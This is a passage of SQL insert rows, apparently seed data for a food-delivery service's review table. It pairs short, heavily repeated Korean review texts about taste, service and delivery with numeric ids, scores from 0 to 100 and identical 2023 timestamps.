	(477, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 13, 20, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(478, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 12, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(479, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 11, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(480, '음식의 맛은 나쁘지 않았지만, 가격 대비 아쉬웠어요.', 11, 13, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(481, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 10, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(482, '음식이 맛이 없어서 먹기 힘들었어요.', 13, 22, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(483, '음식이 매우 짜서 입맛에 맞지 않았습니다.', 11, 16, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(484, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 10, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(485, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 13, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(486, '음식은 그럭저럭 괜찮았지만, 서비스가 아쉬웠어요.', 12, 22, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(487, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 13, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(488, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 14, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(489, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 13, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(490, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(491, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 14, 20, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(492, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(493, '음식이 싱겁고, 퀄리티도 많이 떨어졌어요.', 12, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(494, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 12, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(495, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 10, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(496, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 15, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(497, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(498, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(499, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 11, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(500, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(501, '주문한 음식이 전혀 맞지 않았고, 맛도 없었어요.', 12, 12, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(502, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 12, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(503, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(504, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 10, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(505, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(506, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 10, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(507, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 11, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(508, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 12, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(509, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(510, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(511, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 14, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(512, '음식의 맛과 가격이 모두 만족스러웠습니다.', 13, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(513, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(514, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(515, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(516, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 15, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(517, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 14, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(518, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(519, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 15, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(520, '서비스는 만족스럽지 않았지만, 음식은 괜찮았어요.', 14, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(521, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 15, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(522, '서비스 태도도 좋았고, 음식도 맛있었어요.', 13, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(523, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(524, '음식은 평범했고, 특별한 매력을 찾기 어려웠어요. 다음 번에는 다른 가게를 시도해볼 생각입니다.', 10, 18, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(525, '음식의 맛은 나쁘지 않았지만, 가격 대비 아쉬웠어요.', 11, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(526, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(527, '음식이 완전히 차가웠고, 서비스도 별로였어요.', 11, 20, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(528, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(529, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 14, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(530, '음식이 완전히 망가진 상태로 도착했어요.', 14, 12, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(531, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 12, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(532, '음식의 맛과 가격이 모두 만족스러웠습니다.', 14, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(533, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 10, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(534, '음식이 완전히 차가웠고, 서비스도 별로였어요.', 11, 19, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(535, '음식의 맛과 양 모두 만족스러웠습니다.', 15, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(536, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 12, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(537, '서비스 태도도 좋았고, 음식도 맛있었어요.', 14, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(538, '주문한 음식은 그럭저럭 맛있었지만, 배달이 조금 늦었어요.', 15, 19, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(539, '서비스는 만족스럽지 않았지만, 음식은 괜찮았어요.', 15, 17, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(540, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 10, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(541, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 10, 22, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(542, '주문한 음식은 그럭저럭 맛있었지만, 배달이 조금 늦었어요.', 11, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(543, '음식의 맛과 양 모두 만족스러웠습니다.', 13, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(544, '음식의 맛과 가격이 모두 만족스러웠습니다.', 12, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(545, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 10, 17, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(546, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 15, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(547, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 13, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(548, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 12, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(549, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(550, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 13, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(551, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(552, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(553, '음식의 맛과 양 모두 만족스러웠습니다.', 12, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(554, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 10, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(555, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 12, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(556, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(557, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 10, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(558, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 13, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(559, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(560, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 12, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(561, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 14, 16, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(562, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 10, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(563, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 14, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(564, '음식의 양도 적었고, 맛도 별로였어요.', 10, 22, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(565, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(566, '주문한 음식이 맛이 없었고, 배달이 매우 느렸어요.', 15, 13, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(567, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 12, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(568, '음식은 그럭저럭 괜찮았지만, 기대한 만큼의 만족은 얻지 못했어요.', 14, 12, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(569, '서비스 태도가 좋지 않았고, 음식도 별로였어요.', 14, 16, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(570, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 15, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(571, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 14, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(572, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 12, 22, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(573, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 13, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(574, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(575, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 15, 20, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(576, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 12, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(577, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 13, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(578, '음식이 완전히 차가웠고, 서비스도 별로였어요.', 13, 15, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(579, '서비스 태도도 좋았고, 음식도 맛있었어요.', 15, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(580, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 10, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(581, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(582, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(583, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 13, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(584, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 14, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(585, '음식이 매우 짜서 입맛에 맞지 않았습니다.', 11, 15, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(586, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 10, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(587, '서비스도 엉망이었고, 음식도 실망스러웠어요.', 12, 13, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(588, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(589, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 11, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(590, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 12, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(591, '음식의 맛은 그저 그랬어요. 특별한 인상을 남기지 않았습니다.', 13, 11, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(592, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 13, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(593, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 15, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(594, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 11, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(595, '음식이 너무 늦게 도착했고, 완전히 차가웠어요.', 15, 14, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(596, '음식의 맛과 양 모두 만족스러웠습니다.', 14, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(597, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(598, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(599, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(600, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(601, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 10, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(602, '음식이 완전히 차가웠고, 서비스도 별로였어요.', 11, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(603, '서비스 태도도 좋았고, 음식도 맛있었어요.', 15, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(604, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 13, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(605, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(606, '절대로 다시 주문하지 않을 것입니다. 최악의 경험이었습니다.', 12, 11, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(607, '음식의 맛은 그저 그랬어요. 특별한 인상을 남기지 않았습니다.', 12, 14, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(608, '주문한 음식이 누출되어 왔어요. 매우 불쾌했습니다.', 12, 16, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(609, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 13, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(610, '음식의 맛과 가격이 모두 만족스러웠습니다.', 15, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(611, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 12, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(612, '서비스 태도가 좋지 않았고, 음식도 별로였어요.', 10, 19, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(613, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 11, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(614, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 12, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(615, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 12, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(616, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(617, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 13, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(618, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 12, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(619, '음식의 맛은 그저 그랬어요. 기대한 만큼의 풍부한 맛은 아니었습니다.', 15, 14, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(620, '음식이 맛있었고, 서비스도 만족스러웠어요.', 15, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(621, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 15, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(622, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(623, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 13, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(624, '음식의 맛과 가격이 모두 만족스러웠습니다.', 13, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(625, '음식의 맛은 그저 그랬어요. 특별한 인상을 남기지 않았습니다.', 12, 18, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(626, '음식의 맛과 양 모두 만족스러웠습니다.', 12, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(627, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 14, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(628, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(629, '음식이 맛이 없어서 먹기 힘들었어요.', 12, 14, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(630, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(631, '음식의 퀄리티가 형편없었고, 서비스도 최악이었습니다.', 14, 20, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(632, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(633, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 11, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(634, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 14, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(635, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 13, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(636, '음식의 맛과 양 모두 만족스러웠습니다.', 14, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(637, '서비스는 만족스럽지 않았지만, 음식은 괜찮았어요.', 13, 13, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(638, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 12, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(639, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(640, '음식의 양도 적었고, 맛도 별로였어요.', 11, 20, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(641, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 11, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(642, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(643, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 15, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(644, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(645, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 11, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(646, '음식이 맛있었고, 서비스도 만족스러웠어요.', 11, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(647, '맛은 있었지만, 음식의 양이 조금 부족했습니다.', 10, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(648, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(649, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(650, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 14, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
